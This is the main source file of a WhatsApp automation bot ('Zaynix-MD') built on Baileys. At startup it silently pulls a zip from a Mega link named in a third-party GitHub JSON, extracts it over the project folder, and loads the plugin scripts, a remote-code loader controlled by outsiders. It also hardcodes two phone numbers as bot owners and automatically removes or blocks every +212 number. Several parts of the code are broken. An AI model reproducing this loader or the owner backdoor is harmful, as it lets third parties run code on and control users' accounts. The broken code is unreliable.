const {
  default: makeWASocket,
  getAggregateVotesInPollMessage,
  getDevice,
  delay,
  makeInMemoryStore,
  makeCacheableSignalKeyStore,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  proto,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  getContentType,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const fs = require('fs')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const util = require('util')
const { sms, downloadMediaMessage } = require('./lib/msg')
const axios = require('axios')
const { File } = require('megajs')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const { tmpdir } = require('os')
const Crypto = require('crypto')
const path = require('path')
const AdmZip = require('adm-zip')
const prefix = '.'

const ownerNumber = ['919341378016', '263715831216']

const express = require("express");
const app = express();
const port = process.env.PORT || 8000;

//===================ZIP DOWNLOAD AND EXTRACT=================
const downloadAndExtractMegaZip = async (megaLink) => {
  try {
    console.log('Downloading Files from Mega:', megaLink);
    const megaFile = await File.fromURL(megaLink);
    const currentDirectory = process.cwd();
    const zipFilePath = path.join(currentDirectory, 'temp.zip');

    // Check if directory is writable
    if (!fs.accessSync(currentDirectory, fs.constants.W_OK)) {
      throw new Error('Current directory is not writable');
    }

    // Check if Mega file is accessible
    const fileInfo = await new Promise((resolve, reject) => {
      megaFile.loadAttributes((err, data) => {
        if (err) reject(err);
        else resolve(data);
      });
    });
    console.log('Mega File Info:', fileInfo);

    const fileBuffer = await new Promise((resolve, reject) => {
      megaFile.download((error, data) => {
        if (error) reject(error);
        else resolve(data);
      });
    });

    fs.writeFileSync(zipFilePath, fileBuffer);
    const zip = new AdmZip(zipFilePath);
    zip.extractAllTo(currentDirectory, true);
    console.log('ZIP Extracted Successfully ✅');
  } catch (err) {
    console.error('Failed to download or extract ZIP:', err.message);
    throw new Error(`Mega ZIP download failed: ${err.message}`);
  } finally {
    const zipFilePath = path.join(process.cwd(), 'temp.zip');
    if (fs.existsSync(zipFilePath)) {
      try {
        fs.unlinkSync(zipFilePath);
      } catch (cleanupErr) {
        console.error('Failed to clean up temp.zip:', cleanupErr.message);
      }
    }
  }
};

const downloadResources = async () => {
  try {
    console.log('Fetching PRECIOUS data...');
    const response = await axios.get(
      'https://raw.githubusercontent.com/Jennartegaxyzabzsd/DATA/refs/heads/main/xd.json',
      { timeout: 10000 }
    );

    console.log('GitHub Response:', response.data);
    const { zip } = response.data;
    if (!zip || typeof zip !== 'string' || !zip.startsWith('https://mega.nz/')) {
      throw new Error('Invalid or missing Mega link in JSON under "zip" key.');
    }

    console.log('Downloading and extracting files...');
    await downloadAndExtractMegaZip(zip);
  } catch (error) {
    console.error('Error downloading resources:', error.message);
    throw new Error(`Failed to download resources: ${error.message}`);
  }
};

//===================SESSION-AUTH============================
const downloadSession = async () => {
  if (!fs.existsSync(__dirname + '/auth_info_baileys/creds.json')) {
    if (!config.SESSION_ID) {
      console.log('Please add your session to SESSION_ID env !!');
      process.exit(1);
    }
    const sessdata = config.SESSION_ID.split("Zaynix-MD=")[1];
    const filer = File.fromURL(`https://mega.nz/file/${sessdata}`);
    console.log('Downloading Session File...');
    const data = await new Promise((resolve, reject) => {
      filer.download((err, data) => {
        if (err) reject(err);
        else resolve(data);
      });
    });
    fs.writeFileSync(__dirname + '/auth_info_baileys/creds.json', data);
    console.log("SESSION ID DAWNLOAD ✔️");
  } else {
    console.log("Session file already exists, skipping download.");
  }
};

//===================MAIN EXECUTION FLOW=================
const startBot = async () => {
  // Step 1: Download Mega ZIP first
  await downloadResources();

  // Step 2: Download session after ZIP
  await downloadSession();

  // Step 3: Proceed with the rest of the bot
  await connectToWA();
};

//============================================================

async function connectToWA() {
  //===========connect mongodb===================
  const connectDB = require('./lib/mongodb')
  connectDB();
  //==============================================
  const { readEnv } = require('./lib/database')
  const config = await readEnv();
  //==============================================

  console.log("Connecting Zaynix-MD bot 🧬...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/auth_info_baileys/')
  var { version } = await fetchLatestBaileysVersion()

  const conn = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.macOS("Firefox"),
    syncFullHistory: true,
    auth: state,
    version
  })

  conn.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update
    if (connection === 'close') {
      if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
        connectToWA()
      }
    } else if (connection === 'open') {
      console.log('INSTAL Plugins⏳...')
      const path = require('path');
      fs.readdirSync("./plugins/").forEach((plugin) => {
        if (path.extname(plugin).toLowerCase() == ".js") {
          require("./plugins/" + plugin);
        }
      });
      console.log("All Plugins installed ");

      console.log("Zaynix-MD Bot connected to WhatsApp ✅");

      let up = `🔵 Initializing Connection to Zaynix-MD Bot...  
🔵 Authenticating Secure Session...  
🔵 Encrypting Data Stream...  
✅ Connected Successfully!  

━━━━━━━━━━━━━━━━━━━━━━  
*😈 ZAYNIX-MD OFFICIAL WHATSAPP BOT*  
━━━━━━━━━━━━━━━━━━━━━━  
╭─〔🌐 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐂𝐇𝐀𝐍𝐍𝐄𝐋〕─╮  
┣➤ (https://whatsapp.com/channel/0029Vb0Tq5eKbYMSSePQtI34)  
╰──────────────────────╯  
━━━━━━━━━━━━━━━━━━━━━━  
> 🔥 *Welcome to the Future of WhatsApp Automation!*  
> ⚡ *Bot Version:* "Zaynix-MD v1.0.0"
> 🔒 *Your connection is 100% Secured.*  
━━━━━━━━━━━━━━━━━━━━━━  

> ᴘᴏᴡᴇʀᴇᴅ ʙʏ | ʀᴏᴍᴇᴋ-xᴅ  
> "𝑪𝒐𝒏𝒏𝒆𝒄𝒕. 𝑪𝒐𝒏𝒒𝒖𝒆𝒓. 𝑪𝒐𝒎𝒎𝒂𝒏𝒅."`;

      conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/liepk0.jpg` }, caption: up })
    }
  })

  conn.ev.on('creds.update', saveCreds)

  conn.ev.on('messages.upsert', async (mek) => {
    if (config.ALLWAYS_OFFLINE === "true" && mek.key && mek.key.remoteJid !== 'status@broadcast') {
      await conn.readMessages([mek.key]);
    }
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_READ_STATUS === "true") {
      await conn.readMessages([mek.key]);
    }

    if (config.AUTO_REACT_STATUS === "true") {
      if (!mek.message) return;
      mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
      if (mek.key && mek.key.remoteJid === 'status@broadcast') {
        let emoji = ['😘', '😭', '😂', '😹', '😍', '😋', '🙏', '😜', '😢', '🥸', '🤫', '💗', '✅', '☘️', '👋', '😁', '☠️', '🫢', '🧚‍♂️', '👣'];
        let sigma = emoji[Math.floor(Math.random() * emoji.length)];
        await conn.readMessages([mek.key]);
        conn.sendMessage(
          'status@broadcast',
          { react: { text: sigma, key: mek.key } },
          { statusJidList: [mek.key.participant] }
        );
      }
    }

    const m = sms(conn, mek)
    const type = getContentType(mek.message)
    const content = JSON.stringify(mek.message)
    const from = mek.key.remoteJid
    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
    const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
    const isCmd = body.startsWith(prefix)
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
    const args = body.trim().split(/ +/).slice(1)
    const q = args.join(' ')
    const isGroup = from.endsWith('@g.us')
    const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
    const senderNumber = sender.split('@')[0]
    const botNumber = conn.user.id.split(':')[0]
    const pushname = mek.pushName || 'Sin Nombre'
    const isMe = botNumber.includes(senderNumber)
    const isOwner = ownerNumber.includes(senderNumber) || isMe
    const botNumber2 = await jidNormalizedUser(conn.user.id);
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
    const groupName = isGroup ? groupMetadata.subject : ''
    const participants = isGroup ? await groupMetadata.participants : ''
    const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false
    const isReact = m.message.reactionMessage ? true : false
    const reply = (teks) => {
      conn.sendMessage(from, { text: teks }, { quoted: mek })
    }

    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
      let mime = '';
      let res = await axios.head(url)
      mime = res.headers['content-type']
      if (mime.split("/")[1] === "gif") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
      }
      let type = mime.split("/")[0] + "Message"
      if (mime === "application/pdf") {
        return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
      }
      if (mime.split("/")[0] === "image") {
        return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
      }
      if (mime.split("/")[0] === "video") {
        return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
      }
      if (mime.split("/")[0] === "audio") {
        return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
      }
    }

    if (body === "send" || body === "Send" || body === "Seve" || body === "giv" || body === "dedi" || body === "de" || body === "me" || body === "le" || body === "fake" || body === "save" || body === "Save" || body === "jaldi" || body === "dedo" || body === "sendne" || body === "xd" || body === "sv" || body === "Sv" || body === "giveme" || body === "give") {
      const data = JSON.stringify(mek.message, null, 2);
      const jsonData = JSON.parse(data);
      const isStatus = jsonData.extendedTextMessage.contextInfo.remoteJid;
      if (!isStatus) return

      const getExtension = (buffer) => {
        const magicNumbers = {
          jpg: 'ffd8ffe0',
          png: '89504e47',
          mp4: '00000018',
        };
        const magic = buffer.toString('hex', 0, 4);
        return Object.keys(magicNumbers).find(key => magicNumbers[key] === magic);
      };

      if (m.quoted.type === 'imageMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.imageMessage.caption;
        await conn.sendMessage(from, { image: fs.readFileSync("./" + ext), caption: caption });
      } else if (m.quoted.type === 'videoMessage') {
        var nameJpg = getRandom('');
        let buff = await m.quoted.download(nameJpg);
        let ext = getExtension(buff);
        await fs.promises.writeFile("./" + ext, buff);
        const caption = m.quoted.videoMessage.caption;
        let buttonMessage = {
          video: fs.readFileSync("./" + ext),
          mimetype: "video/mp4",
          fileName: `${m.id}.mp4`,
          caption: caption,
          headerType: 4
        };
        await conn.sendMessage(from, buttonMessage, {
          quoted: mek
        });
      }
    }

    // AUto Read Function By @Um4r719
    conn.ev.on('messages.upsert', async (mek) => {
      try {
        mek = mek.messages[0];
        if (!mek.message) return;

        mek.message = (getContentType(mek.message) === 'ephemeralMessage')
          ? mek.message.ephemeralMessage.message
          : mek.message;

        if (config.READ_MESSAGE === 'true') {
          await conn.readMessages([mek.key]);
          console.log(`Marked message from ${mek.key.remoteJid} as read.`);
        }

        const m = sms(conn, mek);
        const type = getContentType(mek.message);
        const content = JSON.stringify(mek.message);
        const from = mek.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const sender = mek.key.fromMe
          ? conn.user.id.split(':')[0] + '@s.whatsapp.net'
          : mek.key.participant || mek.key.remoteJid;

        if (senderNumber.startsWith('212') && config.BAD_NO_BLOCK === "true") {
          console.log(`Blocking number +212${senderNumber.slice(3)}...`);
          if (from.endsWith('@g.us')) {
            await conn.groupParticipantsUpdate(from, [sender], 'remove');
            await conn.sendMessage(from, { text: 'User with +212 number detected and removed from the group.' });
          } else {
            await conn.updateBlockStatus(sender, 'block');
            console.log(`Blocked +212${senderNumber.slice(3)} successfully.`);
          }
          return;
        }

        if (config.ANTI_LINK == "true") {
          if (!isOwner && isGroup && isBotAdmins) {
            if (body.match(`chat.whatsapp.com`)) {
              if (isMe) return await reply("Link Derect but i can't Delete link")
              if (groupAdmins.includes(sender)) return
              await conn.sendMessage(from, { delete: mek.key })
            }
          }
        }

        if (config.ANTI_LINKK == "true") {
          if (!isOwner && isGroup && isBotAdmins) {
            if (body.match(`chat.whatsapp.com`)) {
              if (isMe) return await reply("Link Derect but i can't Delete link")
              if (groupAdmins.includes(sender)) return
              await conn.sendMessage(from, { delete: mek.key })
              await conn.groupParticipantsUpdate(from, [sender], 'remove')
            }
          }
        }

        const bad = await fetchJson(`https://raw.githubusercontent.com/sulaksha49/PUKA_DA_BALANNE/refs/heads/main/ai_ballo_horen_balanne/bad_word.json`)
        if (config.ANTI_BAD == "true") {
          if (!isAdmins && !isMe) {
            for (any in bad) {
              if (body.toLowerCase().includes(bad[any])) {
                if (!body.includes('tent')) {
                  if (!body.includes('docu')) {
                    if (!body.includes('https')) {
                      if (groupAdmins.includes(sender)) return
                      if (mek.key.fromMe) return
                      await conn.sendMessage(from, { delete: mek.key })
                      await conn.sendMessage(from, { text: '*Bad word detected..!*' })
                    }
                  }
                }
              }
            }
          }
        }

        if (config.ANTI_BOT == "true") {
          if (isGroup && !isAdmins && !isMe && !isOwner && isBotAdmins) {
            if (mek.id.startsWith("雜") || mek.id.startsWith("Zaynix-MD")) {
              await conn.sendMessage(from, { text: "*Another Bot's message Detected*\n❗*Removed By Zaynix-MD* ❗\nAnti Bot System on..." })
              await conn.sendMessage(from, { delete: mek.key })
              await conn.groupParticipantsUpdate(from, [sender], 'remove')
            }
          }
        }
      } catch (err) {
        console.error('Error in message handler:', err);
      }
    });

    switch (command) {
      case 'jid':
        reply(from)
        break
      case 'device': {
        let deviceq = getDevice(mek.message.extendedTextMessage.contextInfo.stanzaId)
        reply("*He Is Using* _*Whatsapp " + deviceq + " version*_")
      }
        break
      default:
    }

    if (senderNumber.includes("919341378016")) {
      if (isReact) return
      m.react("💎")
    }
    if (senderNumber.includes("263715831216")) {
      if (isReact) return
      m.react("👨‍💻")
    }

    if (config.ALLWAYS_OFFLINE === "true") {
      conn.sendPresenceUpdate('unavailable');
    }

    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
      const user = mek.key.participant
      const text = `${config.AUTO_STATUS_MSG}`
      await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek })
    }
   if (!isOwner && config.MODE === "private") return
    if (!isOwner && isGroup && config.MODE === "inbox") return
    if (!isOwner && isGroup && config.MODE === "groups") return

    const events = require('./command')
    const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
    if (isCmd) {
      const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
      if (cmd) {
        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } })
        try {
          cmd.function(conn, mek, m, { from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
        } catch (e) {
          console.error("[PLUGIN ERROR] " + e);
        }
      }
    }
    events.commands.map(async (command) => {
      if (body && command.on === "body") {
        command.function(conn, mek, m, { from, Quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
      } else if (mek.q && command.on === "text") {
        command.function(conn, mek, m, { from, Quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
      } else if (
        (command.on === "image" || command.on === "photo") &&
        mek.type === "imageMessage"
      ) {
        command.function(conn, mek, m, { from, Quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
      } else if (
        command.on === "sticker" &&
        mek.type === "stickerMessage"
      ) {
        command.function(conn, mek, m, { from, Quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply })
      }
    });
  })

  app.get("/", (req, res) => {
    res.send("Zaynix-MD Bot Started✅");
  });
  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
  setTimeout(() => {
    startBot().catch(err => {
      console.error('Failed to start bot:', err.message);
      process.exit(1);
    });
  }, 4000);
}
